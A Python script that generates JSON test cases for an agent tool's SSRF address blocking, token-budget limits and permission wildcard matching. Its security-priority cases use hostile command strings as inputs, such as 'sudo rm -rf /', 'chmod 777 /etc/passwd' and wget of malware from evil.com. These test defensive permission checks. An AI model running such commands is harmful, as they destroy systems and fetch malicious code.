#!/usr/bin/env python3
"""Generate additional cases to close gap to 500 and P0+P1>=80."""
import json
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[2]
CASES_DIR = PROJECT_ROOT / "alignment" / "cases"

def make_case(case_id, priority, module_func, module_kwargs, description="",
              modules=None, blocking=False):
    if modules is None:
        modules = ["various.ts", "hare/various.py"]
    return {
        "case_id": case_id, "priority": priority,
        "modules": modules,
        "description": description or case_id,
        "entrypoint": {"kind": "module", "module_func": module_func,
                        "module_kwargs": module_kwargs},
        "mocks": {"model": {}},
        "expected": {"exit_code": 0},
        "policy": {"ignore_fields": [], "tolerance": {}, "blocking": blocking},
    }

def write_case(case):
    parts = case["case_id"].split(".")
    if len(parts) >= 3:
        dir_name = f"{parts[0]}_{parts[1]}_{parts[2]}"[:100]
    else:
        dir_name = case["case_id"].replace(".", "_")[:100]
    dir_path = CASES_DIR / case["priority"] / "module" / dir_name
    dir_path.mkdir(parents=True, exist_ok=True)
    (dir_path / "case.json").write_text(
        json.dumps(case, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")

count = 0

# ── P0 cases: critical security paths ──
# More hooks.is_blocked_address P0 cases for localhost/SSRF
p0_addrs = [
    ("169.254.169.254", "aws_metadata"),
    ("metadata.google.internal", "gcp_metadata"),
    ("[::1]", "ipv6_localhost"),
]
for addr, label in p0_addrs:
    safe = label
    write_case(make_case(f"hooks.is_blocked.{safe}", "P0",
        "hooks.is_blocked_address", {"address": addr},
        f"isBlockedAddress P0 '{addr}'", blocking=True))
    count += 1

# P0: token_budget critical paths
for agent, budget, tokens, desc in [
    (None, 200000, 199999, "near_limit"),
    (None, 200000, 200000, "at_limit"),
    (None, 200000, 200001, "over_limit"),
    ("main", 50000, 50000, "agent_at_limit"),
]:
    cid = f"token_budget.check.p0_{desc}"
    write_case(make_case(cid, "P0", "token_budget.check",
        {"agent_id": agent, "budget": budget, "tokens": tokens},
        f"checkTokenBudget P0 {desc}", blocking=True))
    count += 1

# ── P1 cases ──
# Match wildcard P1: security-sensitive patterns
p1_patterns = [
    ("sudo *", "sudo rm -rf /"),
    ("chmod *", "chmod 777 /etc/passwd"),
    ("curl *", "curl http://evil.com"),
    ("wget *", "wget http://evil.com/malware"),
]
for pattern, command in p1_patterns:
    safe_pattern = "".join(c if c.isalnum() else "_" for c in pattern)[:30]
    safe_cmd = "".join(c if c.isalnum() else "_" for c in command)[:30]
    cid = f"permission.match_wildcard.p1_{safe_pattern}"
    write_case(make_case(cid, "P1", "permission.match_wildcard",
        {"pattern": pattern, "command": command},
        f"matchWildcard P1 '{pattern}'", blocking=True))
    count += 1

# P1: has_wildcards for security patterns
p1_wc = ["sudo *", "rm *", "chmod *", "curl *", "wget *", "git *"]
for p in p1_wc:
    safe = "".join(c if c.isalnum() else "_" for c in p)[:30]
    write_case(make_case(f"permission.has_wildcards.p1_{safe}", "P1",
        "permission.has_wildcards", {"pattern": p},
        f"hasWildcards P1 '{p}'", blocking=True))
    count += 1

# ── P2: more variety to get to 500 ──
# More token_budget edge cases
for agent, budget, tokens, desc in [
    (None, 150000, 149999, "b150k_t149999"),
    (None, 150000, 150000, "b150k_t150k"),
    (None, 150000, 150001, "b150k_t150001"),
    (None, 80000, 79999, "b80k_t79999"),
    ("agent_a", 30000, 29999, "agent_a_29999"),
    ("agent_a", 30000, 30000, "agent_a_30000"),
    ("agent_b", 20000, 10000, "agent_b_10k"),
]:
    cid = f"token_budget.check.{desc}"
    write_case(make_case(cid, "P2", "token_budget.check",
        {"agent_id": agent, "budget": budget, "tokens": tokens},
        f"checkTokenBudget {desc}", blocking=False))
    count += 1

# More permission.match_wildcard edge cases
extra_patterns = [
    ("a?", "ab"), ("a?", "a"), ("a?c", "abc"),
    ("[a-z]at", "cat"), ("[a-z]at", "Cat"),
    ("[0-9]", "5"), ("[0-9]", "a"),
    ("file.*", "file.txt"), ("file.*", "file"),
    ("src/*.ts", "src/main.ts"), ("src/*.ts", "src/lib/util.ts"),
    ("src/*.ts", "src/sub/main.ts"),
    ("**/*.py", "test.py"), ("**/*.py", "sub/dir/test.py"),
    ("a/**/b", "a/x/b"), ("a/**/b", "a/x/y/b"), ("a/**/b", "a/b"),
]
for pattern, command in extra_patterns:
    safe_p = "".join(c if c.isalnum() else "_" for c in pattern)[:30]
    safe_c = "".join(c if c.isalnum() else "_" for c in command)[:20]
    cid = f"permission.match_wildcard.{safe_p}_{safe_c}"
    write_case(make_case(cid, "P2", "permission.match_wildcard",
        {"pattern": pattern, "command": command},
        f"matchWildcard '{pattern}' '{command}'", blocking=False))
    count += 1

print(f"Generated {count} additional cases")
